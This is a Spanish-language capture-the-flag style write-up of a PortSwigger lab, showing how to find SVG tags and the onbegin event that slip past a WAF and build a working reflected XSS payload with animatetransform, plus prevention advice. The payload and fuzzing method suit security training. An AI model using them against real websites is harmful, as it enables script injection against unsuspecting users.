# 🧪 Reflected XSS with some SVG markup allowed

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-Reflected%20XSS%20%7C%20SVG%20Bypass-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una
vulnerabilidad **Reflected XSS** en el buscador. El WAF bloquea las etiquetas
HTML comunes, pero **deja pasar algunas etiquetas SVG y ciertos eventos**.
Mediante fuzzing con **Burp Intruder**, se descubre que `<svg>` y
`<animatetransform>` están permitidas, junto con el evento `onbegin`.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Fuzzing etiquetas | Burp Intruder + XSS Cheat Sheet | `<svg>`, `<animatetransform>` |
| Fuzzing eventos | Burp Intruder + XSS Cheat Sheet | `onbegin` |
| Payload | `<svg><animatetransform onbegin=alert(1) attributeName=transform>` | ✅ Lab resuelto |

---

## 🎯 Objetivo

Ejecutar `alert(1)` a través de una etiqueta SVG que el WAF no bloquea.

---

## 📖 Contexto: SVG como vector de XSS

**SVG** (Scalable Vector Graphics) es un formato de imagen basado en XML que
permite **incluir JavaScript**. Muchos WAF bloquean `<script>`, `<img>` o
`<svg>`, pero **olvidan bloquear etiquetas SVG menos comunes** como
`<animatetransform>`, que puede ejecutar código a través de sus eventos.

**Ventaja para el atacante:** si el WAF solo bloquea "lo común", siempre
queda alguna etiqueta SVG exótica que se cuela.

---

## 🔍 Análisis

### 1. Confirmar la reflexión

El buscador refleja el input:

```
/?search=test
```

Los payloads comunes (`<script>`, `<img>`) devuelven **400 Bad Request**.

### 2. Enumerar etiquetas permitidas

Se envía la petición a **Burp Intruder** con posición de payload:

```
/?search=<§§>
```

Se carga la lista de **tags** desde el
[XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
(botón "Copy tags to clipboard").

**Resultado:**

| Payload | Status |
|---------|--------|
| `<script>`, `<img>`, `<body>`... | 400 (bloqueadas) |
| **`<svg>`** | **200 OK** ✅ |
| **`<animatetransform>`** | **200 OK** ✅ |

### 3. Enumerar eventos permitidos

Se prueban eventos sobre `<animatetransform>`:

```
/?search=<svg><animatetransform%20§§=1>
```

Se carga la lista de **events** desde el XSS Cheat Sheet (botón "Copy events
to clipboard").

**Resultado:**

| Payload | Status |
|---------|--------|
| `onload`, `onerror`, `onclick`... | 400 (bloqueados) |
| **`onbegin`** | **200 OK** ✅ |

✅ El único evento permitido es **`onbegin`** (se dispara al iniciar una
animación SVG).

---

## 💥 Explotación

### 4. Construir el payload

```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

**Desglose:**

| Parte | Función |
|-------|---------|
| `<svg>` | Abre el contexto SVG (no bloqueado). |
| `<animatetransform>` | Etiqueta SVG que permite animar transformaciones. |
| `onbegin=alert(1)` | Evento que se dispara al iniciar la animación. |
| `attributeName=transform` | Indica qué atributo animar. **Sin esto, la animación no se inicia** y `onbegin` no se dispara. |

### 5. Ejecutar el ataque

Payload URL-encoded:

```
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%20attributeName=transform%3E
```

URL final:

```
https://<lab-id>.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%20attributeName=transform%3E
```

Al cargar, se ejecuta `alert(1)` y el lab se marca como **Solved**.

---

## 📸 Evidencia

<img width="1177" height="184" alt="image" src="https://github.com/user-attachments/assets/be5fa670-d47a-49ef-af7b-4de6ded21920" />


---

## 🧠 Lecciones aprendidas

1. **Los WAF no bloquean todo.** Siempre queda alguna etiqueta exótica que se
   cuela.
2. **SVG es un vector potentísimo.** Muchas etiquetas SVG (`<animate>`,
   `<animatetransform>`, `<set>`, `<handler>`) permiten ejecutar JavaScript.
3. **`onbegin` es un evento SVG poco común.** Los WAF que bloquean
   `onload`/`onerror`/`onclick` a veces olvidan los eventos SVG.
4. **`attributeName=transform` es obligatorio.** Sin un atributo que animar,
   la animación no se inicia y `onbegin` no se dispara.
5. **Burp Intruder + XSS Cheat Sheet** sigue siendo la mejor combinación para
   enumerar vectores.
6. **Las blacklists son frágiles.** La única defensa real es **escapar el
   input** correctamente.

---

## 🛡️ ¿Cómo se previene?

1. **Escapar caracteres peligrosos** (`<`, `>`, `"`, `'`, `&`) en el input.
2. **Sanitizar con DOMPurify**, que elimina etiquetas y atributos peligrosos,
   incluyendo SVG.
3. **Content Security Policy (CSP)** que bloquee scripts inline.
4. **WAF bien configurado**: no solo bloquear etiquetas HTML comunes, sino
   **todas** las etiquetas que permiten eventos (SVG incluido).
5. **Escape contextual** según dónde se refleje el input.

---

## 🛠️ Herramientas utilizadas

- Burp Suite (Proxy, Intruder)
- XSS Cheat Sheet (PortSwigger)
- Navegador web

---

## 📚 Referencias

- [PortSwigger - Reflected XSS with SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-some-svg-markup-allowed)
- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [MDN - SVG Animation](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animatetransform)
- [MDN - onbegin](https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-11
